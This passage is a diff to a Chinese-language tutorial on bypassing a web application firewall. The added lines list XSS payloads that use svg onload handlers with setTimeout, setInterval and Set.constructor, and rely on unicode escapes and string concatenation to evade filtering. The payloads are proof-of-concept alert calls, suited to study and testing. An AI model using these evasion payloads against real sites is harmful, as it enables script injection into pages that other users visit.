@@ -136,10 +136,24 @@ waf拦截
 ```
 ![17](https://ws1.sinaimg.cn/large/005DAKuvgy1g1xy2v7lvnj30uj05d74p.jpg)
 
+编码下，就绕过了。
 ```html
 <svg/onload=setTimeout`alert\u0028233\u0029`>
 ```
 ![18](https://ws1.sinaimg.cn/large/005DAKuvgy1g1xy76ggesj30uj0813z5.jpg)
 
+`setInterval`也能执行代码，常见的拼接。
 
+`<svg/onload=setInterval('al'%2b'ert(1)')>`
 
+`Set.constructor`不是很常见，但是也能执行代码。
+`<svg/onload=Set.constructor('ale'%2B'rt(13)')()>`
+
+其他：
+
+```html
+<svg/onload=setInterval`alert\u0028233\u0029`>
+ //注意后面2个反引号
+<svg/onload=Set.constructor`alert\u0028233\u0029```>
+
+```
